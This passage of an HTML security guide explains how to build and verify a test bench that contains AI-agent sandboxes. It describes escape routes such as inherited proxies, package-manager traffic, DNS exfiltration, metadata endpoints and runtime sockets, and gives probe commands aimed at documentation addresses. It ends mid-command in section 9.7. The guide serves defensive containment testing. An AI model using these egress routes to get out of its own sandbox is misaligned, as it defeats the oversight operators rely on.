@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>How to Test an AI Agent Sandbox for Data Leaks and Network-Restriction Bypasses — Agent Lab Journal</title>
+  <meta name="description" content="Build and verify an advanced AI-agent sandbox test bench with deny-by-default egress controls, decoy credentials, detailed logging, and repeatable containment checks.">
+  <link rel="canonical" href="https://agentlabjournal.online/en/ai-agent-sandbox-egress-test.html">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../reading.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "How to Test an AI Agent Sandbox for Data Leaks and Network-Restriction Bypasses",
+    "description": "Build and verify an advanced AI-agent sandbox test bench with deny-by-default egress controls, decoy credentials, detailed logging, and repeatable containment checks.",
+    "author": {
+      "@type": "Organization",
+      "name": "Agent Lab Journal"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Agent Lab Journal"
+    },
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://agentlabjournal.online/en/ai-agent-sandbox-egress-test.html"
+    }
+  }
+  </script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="container">
+      <a class="site-title" href="../index.html">Agent Lab Journal</a>
+      <nav aria-label="Primary navigation">
+        <a href="guides.html">Guides</a>
+        <a href="glossary.html">Glossary</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="reading">
+    <article>
+      <header class="article-header">
+        <p class="eyebrow">Advanced security guide</p>
+        <h1>How to Test an AI Agent Sandbox for Data Leaks and Network-Restriction Bypasses</h1>
+        <div class="reading-meta">
+          <span>Advanced</span>
+          <span>90 minutes</span>
+          <span>Security engineering</span>
+        </div>
+        <p class="lead"><strong>A sandbox is not isolated merely because the agent cannot open a browser.</strong> Package managers may inherit proxies, helper processes may retain credentials, DNS may become a covert output path, and a compromised dependency may reach services that the agent itself cannot contact. This guide builds a repeatable test bench that denies arbitrary outbound traffic, plants harmless decoy tokens, records attempted escapes, and proves the controls from several independent observation points.</p>
+      </header>
+
+      <nav class="table-of-contents" aria-label="Article contents">
+        <h2>Contents</h2>
+        <ol>
+          <li><a href="#goal">Goal and security boundary</a></li>
+          <li><a href="#case">Concrete case</a></li>
+          <li><a href="#architecture">Test-bench architecture</a></li>
+          <li><a href="#prerequisites">Prerequisites and safety rules</a></li>
+          <li><a href="#build">Build the isolated workload</a></li>
+          <li><a href="#egress">Enforce deny-by-default egress</a></li>
+          <li><a href="#tokens">Plant decoy tokens</a></li>
+          <li><a href="#logging">Collect independent logs</a></li>
+          <li><a href="#tests">Run the containment test suite</a></li>
+          <li><a href="#verification">Verify the result</a></li>
+          <li><a href="#failures">Failure cases and remediation</a></li>
+          <li><a href="#limitations">Limitations</a></li>
+          <li><a href="#checklist">Repeatable checklist</a></li>
+        </ol>
+      </nav>
+
+      <section id="goal">
+        <h2>1. Goal and security boundary</h2>
+
+        <p>An AI-agent <a href="glossary.html#sandbox">sandbox</a> is a constrained execution environment in which model-directed code can read, create, and execute files without receiving the host’s full authority. The test target is not “the container” in isolation. It is the complete path from the agent process through its runtime, kernel, network stack, resolvers, proxies, credential providers, orchestration layer, and external services.</p>
+
+        <p>The principal concern is unauthorized <a href="glossary.html#egress">egress</a>: any outbound communication not explicitly required by the workload. A successful control should stop arbitrary destinations even when the process changes protocol, uses an inherited proxy, invokes another executable, or tries to encode data in DNS queries.</p>
+
+        <p>By the end of the exercise, the bench should demonstrate all of the following:</p>
+
+        <ul>
+          <li>The sandbox can contact only explicitly approved destinations and ports.</li>
+          <li>Direct IPv4 and IPv6 connections to arbitrary addresses fail.</li>
+          <li>Unapproved DNS resolution is unavailable or tightly mediated.</li>
+          <li>Proxy environment variables and package-manager configuration do not create an alternate route.</li>
+          <li>Cloud metadata endpoints and host-local services are unreachable.</li>
+          <li>Decoy secrets are detectable if read, copied, placed in process arguments, or included in an attempted request.</li>
+          <li>Network denials are logged outside the sandbox’s writable boundary.</li>
+          <li>Attempts to create namespaces, alter routes, load kernel features, or access the container runtime are denied.</li>
+          <li>The approved path remains functional, so the result is not a false success caused by a completely broken network.</li>
+        </ul>
+
+        <aside class="note">
+          <h3>Authorization boundary</h3>
+          <p>Run these checks only on infrastructure you own or are explicitly authorized to test. Use documentation-only IP ranges, local listeners, and synthetic tokens. Do not send probes to unrelated public systems.</p>
+        </aside>
+
+        <h3>Define success before running anything</h3>
+
+        <p>Write the expected decision for every flow. An <a href="glossary.html#allowlist">allowlist</a> without a written flow matrix is difficult to audit and easy to expand accidentally.</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Source</th>
+              <th>Destination</th>
+              <th>Protocol</th>
+              <th>Expected result</th>
+              <th>Required evidence</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Agent workload</td>
+              <td>Approved local gateway</td>
+              <td>TCP 8080</td>
+              <td>Allow</td>
+              <td>Gateway request log and successful response</td>
+            </tr>
+            <tr>
+              <td>Agent workload</td>
+              <td>Documentation address 192.0.2.10</td>
+              <td>TCP 443</td>
+              <td>Deny</td>
+              <td>Host firewall drop log</td>
+            </tr>
+            <tr>
+              <td>Agent workload</td>
+              <td>Arbitrary resolver</td>
+              <td>UDP/TCP 53</td>
+              <td>Deny</td>
+              <td>Firewall or DNS-policy log</td>
+            </tr>
+            <tr>
+              <td>Agent workload</td>
+              <td>Link-local metadata address</td>
+              <td>TCP 80</td>
+              <td>Deny</td>
+              <td>Firewall drop log</td>
+            </tr>
+            <tr>
+              <td>Agent workload</td>
+              <td>Host or container-runtime socket</td>
+              <td>Local socket</td>
+              <td>Deny</td>
+              <td>Missing mount plus access-denied event</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p>A denial counts as verified only when the client observes failure and an independent control-plane log identifies the attempted flow. A timeout by itself is ambiguous: it may represent a firewall, a missing route, a dead service, or a test error.</p>
+      </section>
+
+      <section id="case">
+        <h2>2. Concrete case: the package installer that quietly escapes</h2>
+
+        <p>Consider an internal coding agent that is allowed to edit a repository and run tests. Internet access is supposed to be disabled. The runtime image nevertheless contains a package manager, and the surrounding job inherits <code>HTTPS_PROXY</code> from the build platform. The proxy accepts any destination reachable from its own network segment.</p>
+
+        <p>The agent cannot connect directly to a public address, so a simple <code>curl</code> test appears to confirm isolation. A dependency installation behaves differently: the package manager discovers the inherited proxy and sends the request through it. If a repository token is also present in a configuration file, a malicious package script can read that token and attempt to transmit it along the same path.</p>
+
+        <p>This is not a hypothetical test result; it is the concrete failure pattern our bench is designed to detect. The bench does not depend on a real public proxy, a real credential, or a malicious package. It recreates the relevant conditions using:</p>
+
+        <ul>
+          <li>A local “approved gateway” that records requests without forwarding them to the internet.</li>
+          <li>A fake proxy variable that should not provide usable connectivity.</li>
+          <li>A synthetic token that has no authority anywhere.</li>
+          <li>Host-level firewall logs that the workload cannot modify.</li>
+          <li>Tests covering direct connections, package tools, DNS, metadata addresses, and local privilege boundaries.</li>
+        </ul>
+
+        <p>The design follows <a href="glossary.html#defense-in-depth">defense in depth</a>. Network filtering is necessary, but it is not expected to compensate for a writable runtime socket, excessive kernel privileges, exposed cloud credentials, or an untrusted proxy.</p>
+      </section>
+
+      <section id="architecture">
+        <h2>3. Test-bench architecture</h2>
+
+        <pre><code>                       management / log boundary
+  ┌───────────────────────────────────────────────────────────┐
+  │ Host                                                      │
+  │                                                           │
+  │  ┌──────────────────┐       ┌──────────────────────────┐   │
+  │  │ approved-gateway │       │ host firewall and logs   │   │
+  │  │ 172.30.0.10:8080 │       │ default deny from agent │   │
+  │  └─────────▲────────┘       └────────────▲─────────────┘   │
+  │            │ approved flow               │ denied flows    │
+  │  ┌─────────┴─────────────────────────────┴──────────────┐   │
+  │  │ private bridge: agentlab-test                       │   │
+  │  │                                                     │   │
+  │  │  ┌───────────────────────────────────────────────┐  │   │
+  │  │  │ agent sandbox                                 │  │   │
+  │  │  │ non-root, read-only root, dropped capabilities│  │   │
+  │  │  │ decoy files, test scripts, no runtime socket  │  │   │
+  │  │  └───────────────────────────────────────────────┘  │   │
+  │  └─────────────────────────────────────────────────────┘   │
+  └───────────────────────────────────────────────────────────┘
+
+  Internet forwarding: disabled
+  Arbitrary sandbox egress: denied
+  Approved gateway: records locally and does not forward</code></pre>
+
+        <p>The bridge is an <a href="glossary.html#network-namespace">isolated network namespace</a> attached to a host-controlled virtual interface. The workload has its own network view, but the host enforces the final decision. Keeping enforcement outside the workload matters because a process must not be able to erase the evidence or rewrite its own network policy.</p>
+
+        <p>The gateway is deliberately boring. It accepts a request, records the method, path, selected headers, and body length, then returns a fixed response. It does not recursively resolve user-controlled destinations and does not forward requests. This avoids turning the test fixture into an open proxy.</p>
+
+        <h3>Trust boundaries</h3>
+
+        <ol>
+          <li><strong>Untrusted:</strong> prompts, generated code, repository files, package scripts, tools invoked by the agent, and all files writable by that workload.</li>
+          <li><strong>Partially trusted:</strong> the container image and language runtime. They should be reproducible, but a dependency may still be hostile.</li>
+          <li><strong>Trusted for enforcement:</strong> host firewall, container supervisor, immutable runtime policy, and external log collector.</li>
+          <li><strong>Trusted for evaluation:</strong> the operator’s test manifest and expected-outcome matrix.</li>
+        </ol>
+
+        <p>Use a written <a href="glossary.html#threat-model">threat model</a> to state what is in scope. This bench tests common outbound paths and containment weaknesses. It is not a proof that the kernel, hypervisor, firmware, or container engine has no exploitable vulnerability.</p>
+      </section>
+
+      <section id="prerequisites">
+        <h2>4. Prerequisites and safety rules</h2>
+
+        <p>The commands below assume a dedicated Linux test host with Docker-compatible container commands and root access to configure the host firewall. Adapt the resource names to your environment. Do not perform the exercise on a shared production node.</p>
+
+        <h3>Required components</h3>
+
+        <ul>
+          <li>A disposable Linux virtual machine.</li>
+          <li>A container runtime with user, capability, read-only filesystem, and private-network controls.</li>
+          <li><code>nftables</code> on the host.</li>
+          <li>A minimal workload image containing a shell, <code>curl</code>, Python, and basic network diagnostics.</li>
+          <li>A separate directory or remote destination for host logs.</li>
+          <li>No production secrets, cloud instance role, or mounted home directory.</li>
+        </ul>
+
+        <h3>Safety invariants</h3>
+
+        <ul>
+          <li>Use only synthetic data in the sandbox.</li>
+          <li>Use RFC 5737 documentation networks such as <code>192.0.2.0/24</code>, <code>198.51.100.0/24</code>, and <code>203.0.113.0/24</code> for unreachable test destinations.</li>
+          <li>Use the reserved <code>.invalid</code> suffix for names that must never resolve publicly.</li>
+          <li>Do not mount <code>/var/run/docker.sock</code>, <code>/run/containerd</code>, SSH agents, host credential directories, or the host root filesystem.</li>
+          <li>Do not use real API keys as detectors. A decoy must be harmless even if every safeguard fails.</li>
+          <li>Take a VM snapshot before changing firewall policy.</li>
+          <li>Keep a second administrative session open while testing host firewall rules.</li>
+        </ul>
+
+        <aside class="warning">
+          <h3>Avoid locking yourself out</h3>
+          <p>Apply the test policy to the dedicated container bridge and its forwarding path, not to all host traffic. Verify the bridge interface name before loading rules. If the interface cannot be resolved unambiguously, stop and inspect the runtime configuration.</p>
+        </aside>
+
+        <h3>Record the initial state</h3>
+
+        <pre><code>uname -a
+docker version
+nft --version
+docker info
+ip -brief address
+ip route show
+sysctl net.ipv4.ip_forward
+sysctl net.ipv6.conf.all.forwarding</code></pre>
+
+        <p>Save the output with the test report. Version information is essential when a later runtime or kernel update changes behavior.</p>
+      </section>
+
+      <section id="build">
+        <h2>5. Build the isolated workload</h2>
+
+        <h3>5.1 Create an internal bridge</h3>
+
+        <p>Create a network marked internal so the runtime does not intentionally provide external routing:</p>
+
+        <pre><code>docker network create \
+  --driver bridge \
+  --internal \
+  --subnet 172.30.0.0/24 \
+  --gateway 172.30.0.1 \
+  agentlab-test</code></pre>
+
+        <p>Inspect rather than assume:</p>
+
+        <pre><code>docker network inspect agentlab-test
+ip -brief link
+nft list ruleset</code></pre>
+
+        <p>Record the actual bridge interface corresponding to <code>agentlab-test</code>. Runtime-generated interface names vary, so the firewall configuration must use the observed value rather than a guessed one.</p>
+
+        <h3>5.2 Start a non-forwarding approved gateway</h3>
+
+        <p>The following local Python service records requests to standard output and returns a fixed response. Run it in a small container or image prepared for the test. Its implementation should bind only to the private bridge.</p>
+
+        <pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer
+import json
+import sys
+import time
+
+class Handler(BaseHTTPRequestHandler):
+    def record(self):
+        length = int(self.headers.get("Content-Length", "0"))
+        body = self.rfile.read(min(length, 8192)) if length else b""
+        event = {
+            "time": time.time(),
+            "client": self.client_address[0],
+            "method": self.command,
+            "path": self.path,
+            "host": self.headers.get("Host"),
+            "user_agent": self.headers.get("User-Agent"),
+            "authorization_present": "Authorization" in self.headers,
+            "body_length": len(body)
+        }
+        print(json.dumps(event), flush=True)
+
+    def reply(self):
+        payload = b'{"status":"approved-path-ok"}\n'
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(payload)))
+        self.end_headers()
+        self.wfile.write(payload)
+
+    def do_GET(self):
+        self.record()
+        self.reply()
+
+    def do_POST(self):
+        self.record()
+        self.reply()
+
+    def log_message(self, format, *args):
+        return
+
+HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()</code></pre>
+
+        <p>The log records whether an authorization header was present, but not its value. This is an example of safe <a href="glossary.html#telemetry">telemetry</a>: retain enough context to detect misuse without duplicating sensitive material into another system.</p>
+
+        <p>Build the gateway image from a reviewed local file, then start it:</p>
+
+        <pre><code>docker run -d \
+  --name approved-gateway \
+  --network agentlab-test \
+  --ip 172.30.0.10 \
+  --read-only \
+  --cap-drop ALL \
+  --security-opt no-new-privileges:true \
+  --pids-limit 64 \
+  gateway-test:local</code></pre>
+
+        <p>Do not connect this gateway container to a second, internet-capable network. Confirm:</p>
+
+        <pre><code>docker inspect approved-gateway
+docker exec approved-gateway ip route
+docker exec approved-gateway cat /proc/net/route</code></pre>
+
+        <h3>5.3 Start the sandbox with minimum authority</h3>
+
+        <p>The workload should follow <a href="glossary.html#least-privilege">least privilege</a>. Run as a non-root numeric user, drop all Linux capabilities, prohibit privilege escalation, make the root filesystem read-only, and supply small writable temporary filesystems only where required.</p>
+
+        <pre><code>docker run --rm -it \
+  --name agent-sandbox-test \
+  --network agentlab-test \
+  --ip 172.30.0.20 \
+  --user 65532:65532 \
+  --read-only \
+  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m \
+  --tmpfs /work:rw,nosuid,nodev,size=128m \
+  --cap-drop ALL \
+  --security-opt no-new-privileges:true \
+  --pids-limit 256 \
+  --memory 512m \
+  --cpus 1 \
+  --env HOME=/work \
+  agent-sandbox-test:local \
+  /bin/sh</code></pre>
+
+        <p><a href="glossary.html#linux-capability">Linux capabilities</a> divide traditional root powers into smaller units. Dropping all of them prevents common operations such as changing network configuration, loading modules, tracing unrelated processes, and overriding file permissions. The numeric non-root user remains important because capability removal alone is not a complete identity boundary.</p>
+
+        <p>A <a href="glossary.html#seccomp">seccomp</a> policy can further restrict dangerous system calls. Use the runtime’s maintained default profile as a baseline, then consider a workload-specific profile that denies namespace creation, kernel module operations, mount operations, tracing, and less commonly needed kernel interfaces. Validate the application before making the profile mandatory; an untested profile can break legitimate runtimes and create misleading test failures.</p>
+
+        <h3>5.4 Confirm the absence of dangerous mounts</h3>
+
+        <p>Inside the sandbox, inspect mount and socket exposure:</p>
+
+        <pre><code>id
+cat /proc/self/status
+cat /proc/self/mountinfo
+find /run /var/run -maxdepth 3 -type s -ls 2&gt;/dev/null
+find / -maxdepth 3 \( -name '*.sock' -o -name 'docker.sock' \) -ls 2&gt;/dev/null</code></pre>
+
+        <p>The runtime socket must be absent. A writable <a href="glossary.html#container-runtime-socket">container-runtime socket</a> can effectively grant control over sibling workloads or the host, bypassing the network policy by starting a new privileged process.</p>
+      </section>
+
+      <section id="egress">
+        <h2>6. Enforce deny-by-default egress</h2>
+
+        <p>An internal runtime network is a useful first barrier, but treat it as a configuration convenience, not the sole enforcement mechanism. Add a host-level forwarding policy that permits only the approved gateway flow and records everything else.</p>
+
+        <h3>6.1 Resolve exact interfaces and addresses</h3>
+
+        <p>On the host, identify the bridge interface and verify the assigned addresses:</p>
+
+        <pre><code>docker network inspect agentlab-test
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' approved-gateway
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' agent-sandbox-test
+ip -brief link
+ip -brief address</code></pre>
+
+        <p>In the example below, replace <code>BRIDGE_NAME</code> with the inspected bridge interface. Do not paste a placeholder into a live ruleset.</p>
+
+        <h3>6.2 Add a dedicated nftables table</h3>
+
+        <pre><code>table inet agentlab_sandbox {
+  chain forward {
+    type filter hook forward priority -10; policy accept;
+
+    iifname "BRIDGE_NAME" ip saddr 172.30.0.20 \
+      ip daddr 172.30.0.10 tcp dport 8080 \
+      ct state new,established counter accept
+
+    iifname "BRIDGE_NAME" ip saddr 172.30.0.10 \
+      ip daddr 172.30.0.20 tcp sport 8080 \
+      ct state established counter accept
+
+    iifname "BRIDGE_NAME" ip saddr 172.30.0.20 \
+      limit rate 20/minute burst 20 packets \
+      log prefix "AGENTLAB_EGRESS_DENY " flags all counter drop
+
+    iifname "BRIDGE_NAME" ip saddr 172.30.0.20 counter drop
+  }
+}</code></pre>
+
+        <p>Load the reviewed file using your operating system’s normal nftables mechanism, then inspect the effective policy:</p>
+
+        <pre><code>nft --check -f agentlab-sandbox.nft
+nft -f agentlab-sandbox.nft
+nft list table inet agentlab_sandbox</code></pre>
+
+        <p>The rate limit prevents a noisy workload from exhausting log storage. The second drop rule still blocks packets after logging is rate-limited. Counters provide evidence that additional attempts occurred even when individual log entries were suppressed.</p>
+
+        <h3>6.3 Block local host services explicitly</h3>
+
+        <p>Forward filtering does not necessarily cover packets addressed to the host itself. Add an input-chain rule scoped to the test bridge and sandbox address. Preserve established administration flows and verify rule ordering on the disposable host.</p>
+
+        <pre><code>table inet agentlab_sandbox_input {
+  chain input {
+    type filter hook input priority -10; policy accept;
+
+    iifname "BRIDGE_NAME" ip saddr 172.30.0.20 \
+      limit rate 20/minute burst 20 packets \
+      log prefix "AGENTLAB_HOST_DENY " flags all counter drop
+
+    iifname "BRIDGE_NAME" ip saddr 172.30.0.20 counter drop
+  }
+}</code></pre>
+
+        <p>The approved gateway is another container, so its traffic traverses the forwarding path rather than the host input path. If your network implementation differs, confirm packet traversal with counters before finalizing the rule design.</p>
+
+        <h3>6.4 Address IPv6 deliberately</h3>
+
+        <p>A policy that filters only IPv4 may leave IPv6 as an alternate path. Determine whether the sandbox has IPv6 addresses, routes, or mapped sockets:</p>
+
+        <pre><code>ip -6 address show
+ip -6 route show
+cat /proc/net/if_inet6
+curl -g -6 --max-time 3 'http://[2001:db8::10]/'</code></pre>
+
+        <p>Either disable IPv6 for the isolated network through supported runtime configuration or enforce the same deny-by-default decision in an <code>inet</code> ruleset that covers both address families. Do not rely on “we do not use IPv6” without checking the effective namespace.</p>
+
+        <h3>6.5 Control DNS as a network path</h3>
+
+        <p><a href="glossary.html#dns-exfiltration">DNS exfiltration</a> encodes information in query names and sends it through a resolver. If the workload does not require DNS, the safest policy is to provide no resolver and deny UDP and TCP port 53. If name resolution is required, use a dedicated resolver that:</p>
+
+        <ul>
+          <li>Accepts queries only from the sandbox network.</li>
+          <li>Resolves only approved internal names or an explicit domain set.</li>
+          <li>Rejects arbitrary recursive queries.</li>
+          <li>Logs query name, type, source, decision, and response code outside the sandbox.</li>
+          <li>Limits label length, query rate, uncommon record types, and oversized responses.</li>
+          <li>Does not trust an agent-controlled hostname merely because its suffix looks approved.</li>
+        </ul>
+
+        <p>Domain allowlisting must account for rebinding, redirects, aliases, dual-stack answers, and changing addresses. Prefer a trusted gateway that terminates the approved application protocol over direct destination-by-name access.</p>
+
+        <h3>6.6 Remove proxy escape routes</h3>
+
+        <p>A <a href="glossary.html#forward-proxy">forward proxy</a> can turn one permitted connection into access to many destinations. Inspect environment variables in the launcher, sandbox, tool subprocesses, and package-manager configuration:</p>
+
+        <pre><code>env | sort | grep -iE '(^|_)(http|https|all|no)_proxy='
+git config --list --show-origin 2&gt;/dev/null
+npm config list 2&gt;/dev/null
+python -m pip config debug 2&gt;/dev/null
+find /etc /work -maxdepth 4 -type f \
+  \( -name '.npmrc' -o -name 'pip.conf' -o -name '.gitconfig' \) \
+  -print 2&gt;/dev/null</code></pre>
+
+        <p>Launch the workload with a clean, explicit environment. Do not pass the host environment wholesale. If a proxy is necessary, it becomes a security enforcement component: authenticate workloads, restrict destinations and methods, reject arbitrary tunnels, resolve names safely, log decisions, and prevent access to private, loopback, link-local, and metadata ranges.</p>
+
+        <h3>6.7 Deny cloud metadata and private ranges</h3>
+
+        <p>A cloud <a href="glossary.html#instance-metadata-service">instance metadata service</a> may issue temporary credentials to processes that reach a link-local address. The preferred protection is to run the test node without an attached workload identity. Network-deny rules are a second layer, not a reason to attach unnecessary credentials.</p>
+
+        <p>Test these classes, using short timeouts:</p>
+
+        <ul>
+          <li>IPv4 loopback: <code>127.0.0.0/8</code>.</li>
+          <li>IPv4 link-local: <code>169.254.0.0/16</code>.</li>
+          <li>RFC 1918 private ranges other than the explicitly approved peer.</li>
+          <li>IPv6 loopback: <code>::1</code>.</li>
+          <li>IPv6 link-local: <code>fe80::/10</code>.</li>
+          <li>Host bridge addresses and orchestration control-plane ranges.</li>
+        </ul>
+      </section>
+
+      <section id="tokens">
+        <h2>7. Plant harmless decoy tokens</h2>
+
+        <p>A <a href="glossary.html#canary-token">canary token</a> is synthetic data placed where sensitive data might normally appear so unexpected reads or transmissions become observable. For this bench, use a high-entropy marker with no external authority and a test-specific identifier.</p>
+
+        <h3>7.1 Generate the markers</h3>
+
+        <p>Generate values locally for this run. Do not copy the literal examples into a long-lived test:</p>
+
+        <pre><code>python - &lt;&lt;'PY'
+import secrets
+print("AGENTLAB_DECOY_FILE_" + secrets.token_hex(24))
+print("AGENTLAB_DECOY_ENV_" + secrets.token_hex(24))
+print("AGENTLAB_DECOY_CONFIG_" + secrets.token_hex(24))
+PY</code></pre>
+
+        <p>Record a one-way digest in the operator’s test manifest. Keep the full values only in the disposable fixture and a protected evaluator file:</p>
+
+        <pre><code>printf '%s' "$DECOY_FILE_VALUE" | sha256sum
+printf '%s' "$DECOY_ENV_VALUE" | sha256sum
+printf '%s' "$DECOY_CONFIG_VALUE" | sha256sum</code></pre>
+
+        <p>A digest helps correlate a discovered value without copying the token into every log. Do not assume hashing makes a low-entropy secret safe; these decoys must be random.</p>
+
+        <h3>7.2 Place decoys in representative locations</h3>
+
+        <p>Use separate markers so the source can be identified:</p>
+
+        <ul>
+          <li>A read-only file resembling a tool credential file.</li>
+          <li>An environment variable resembling a service token.</li>
+          <li>A repository-local configuration file.</li>
+          <li>A command-line argument supplied to a controlled helper, if process visibility is in scope.</li>
+        </ul>
+
+        <p>Do not name a decoy after a real provider or format it as a valid production credential. A neutral pattern prevents accidental submission to a real API and avoids training operators to handle authentic-looking secrets casually.</p>
+
+        <h3>7.3 Detect access, not only successful transmission</h3>
+
+        <p>Network controls can show attempted transmission, but they may not show that the agent read a file and retained it in memory. On the host, add file-access auditing for the decoy path or use an equivalent eBPF-based observer. The audit rule must be installed outside the sandbox:</p>
+
+        <pre><code>auditctl -w /path/to/test-fixture/decoy-token -p r -k agentlab_decoy_read
+ausearch -k agentlab_decoy_read</code></pre>
+
+        <p>Bind-mount the fixture read-only into the sandbox only for the test that requires it. The path shown above is illustrative; resolve the exact host path and confirm that it contains no real data.</p>
+
+        <p>For higher assurance, observe process execution and network system calls from the host. Useful fields include container identity, process identity, executable, destination address, destination port, result code, and timestamp. Avoid collecting complete request bodies by default.</p>
+
+        <h3>7.4 Search logs safely</h3>
+
+        <p>Search using the test identifier or digest where possible. If the full token must be searched, run the search in a protected evaluation environment and redact the value from reports.</p>
+
+        <pre><code>grep -R -F 'AGENTLAB_DECOY_' /var/log/agentlab-test
+journalctl --since '10 minutes ago' | grep -F 'AGENTLAB_'
+ausearch -k agentlab_decoy_read</code></pre>
+      </section>
+
+      <section id="logging">
+        <h2>8. Collect independent logs</h2>
+
+        <p>The minimum evidence set should come from at least three layers:</p>
+
+        <ol>
+          <li><strong>Workload observation:</strong> command, exit status, timeout, and error text.</li>
+          <li><strong>Enforcement observation:</strong> firewall decision, counters, source, destination, port, protocol, and timestamp.</li>
+          <li><strong>Approved-gateway observation:</strong> whether the allowed path arrived and whether a decoy indicator appeared.</li>
+        </ol>
+
+        <p>Add DNS and file-access observations when those paths are tested. Store the authoritative copy beyond the workload’s write access.</p>
+
+        <h3>8.1 Capture firewall events</h3>
+
+        <pre><code>journalctl -k -f \
+  | grep --line-buffered -E 'AGENTLAB_(EGRESS|HOST)_DENY'</code></pre>
+
+        <p>In another administrative session, capture counters before and after the suite:</p>
+
+        <pre><code>nft -a list table inet agentlab_sandbox
+nft -a list table inet agentlab_sandbox_input</code></pre>
+
+        <h3>8.2 Capture gateway events</h3>
+
+        <pre><code>docker logs --since 5m --timestamps approved-gateway
+docker logs -f --timestamps approved-gateway</code></pre>
+
+        <p>If the gateway logs are retained through the container runtime, protect the host log directory from sandbox mounts. For a durable system, ship them to an append-oriented collector with retention and access controls.</p>
+
+        <h3>8.3 Use a shared test identifier</h3>
+
+        <p>Assign each run a random identifier and include it in approved requests and test records:</p>
+
+        <pre><code>RUN_ID="agentlab-$(date -u +%Y%m%dT%H%M%SZ)-$(openssl rand -hex 6)"
+printf '%s\n' "$RUN_ID"</code></pre>
+
+        <p>Do not treat the run identifier as secret. Its purpose is correlation. Record clocks and confirm that the host, gateway, and evaluator agree closely enough for event matching.</p>
+
+        <h3>8.4 Define a compact event schema</h3>
+
+        <pre><code>{
+  "run_id": "test-run-identifier",
+  "time": "UTC timestamp",
+  "layer": "workload|firewall|dns|gateway|file-audit",
+  "test_id": "EGR-01",
+  "source": "sandbox identity",
+  "destination": "address or approved service",
+  "protocol": "tcp|udp|local",
+  "port": 443,
+  "decision": "allow|deny|observe",
+  "result": "normalized result",
+  "decoy_indicator": false
+}</code></pre>
+
+        <p>Normalization makes tests comparable across runtime versions. Keep raw logs as evidence, but evaluate pass or fail from a small, documented schema.</p>
+      </section>
+
+      <section id="tests">
+        <h2>9. Run the containment test suite</h2>
+
+        <p>Run each test manually first, then automate it. Use short connection timeouts so a deliberate drop does not stall the suite. Capture standard output, standard error, exit status, start time, and end time.</p>
+
+        <h3>9.1 Positive control: approved gateway</h3>
+
+        <pre><code>curl --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 5 \
+  -H "X-AgentLab-Run: $RUN_ID" \
+  http://172.30.0.10:8080/health</code></pre>
+
+        <p><strong>Expected:</strong> HTTP 200 with <code>approved-path-ok</code>; one matching gateway event; an increment in the allow-rule counter; no deny event.</p>
+
+        <p>If this fails, stop. A suite in which every connection fails cannot distinguish intentional filtering from a broken network.</p>
+
+        <h3>9.2 Direct IPv4 egress</h3>
+
+        <pre><code>curl --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 4 \
+  http://192.0.2.10/
+
+python - &lt;&lt;'PY'
+import socket
+s = socket.socket()
+s.settimeout(3)
+try:
+    s.connect(("198.51.100.20", 443))
+    print("UNEXPECTED_CONNECT")
+except OSError as exc:
+    print(type(exc).__name__, str(exc))
+finally:
+    s.close()
+PY</code></pre>
+
+        <p><strong>Expected:</strong> both connections fail; the host firewall records the source, destination, and port; the deny counter increases.</p>
+
+        <h3>9.3 Direct IPv6 egress</h3>
+
+        <pre><code>curl -g -6 --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 4 \
+  'http://[2001:db8::10]/'</code></pre>
+
+        <p><strong>Expected:</strong> failure because no IPv6 route exists or because the host denies the flow. Document which control produced the result. If the namespace unexpectedly has globally routable IPv6, treat that as a critical test-bench defect.</p>
+
+        <h3>9.4 DNS path</h3>
+
+        <pre><code>getent hosts "$RUN_ID.egress-test.invalid"
+python - &lt;&lt;PY
+import socket
+name = "${RUN_ID}.egress-test.invalid"
+try:
+    print(socket.getaddrinfo(name, 443))
+except OSError as exc:
+    print(type(exc).__name__, str(exc))
+PY</code></pre>
+
+        <p><strong>Expected:</strong> no public resolution. If DNS is disabled, the call fails locally or a port-53 denial appears. If a controlled resolver is present, its log must show a rejected query. A query reaching an uncontrolled recursive resolver is a failure even though <code>.invalid</code> returns no address.</p>
+
+        <h3>9.5 Explicit proxy variables</h3>
+
+        <pre><code>export HTTP_PROXY='http://192.0.2.55:3128'
+export HTTPS_PROXY='http://192.0.2.55:3128'
+export ALL_PROXY='socks5://192.0.2.55:1080'
+
+curl --connect-timeout 2 --max-time 4 http://example.invalid/
+curl --connect-timeout 2 --max-time 4 https://example.invalid/</code></pre>
+
+        <p><strong>Expected:</strong> connection failure and denied attempts to the proxy addresses. Then restart the sandbox from the clean launcher and verify that these variables are absent. The purpose is to prove both that the network blocks an injected proxy and that normal launches do not inherit one.</p>
+
+        <h3>9.6 Package-manager paths without downloading packages</h3>
+
+        <p>Do not contact a real package repository. Point each tool at a reserved destination and request metadata only:</p>
+
+        <pre><code>python -m pip index versions test-package-name \
+  --index-url http://192.0.2.60/simple/ \
+  --timeout 2 \
+  --retries 0
+
+npm view test-package-name version \
+  --registry=http://192.0.2.61/ \
+  --fetch-timeout=2000 \
+  --fetch-retries=0
+
+git -c http.proxy= \
+  ls-remote http://192.0.2.62/test/repository.git</code></pre>
+
+        <p><strong>Expected:</strong> every attempt fails and maps to a firewall denial. Review tool output for evidence that a global proxy, mirror, credential helper, or alternate registry was used instead of the supplied destination.</p>
+
+        <h3>9.7 Metadata and link-local access</h3>
+
+        <pre><code>curl --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 4 \
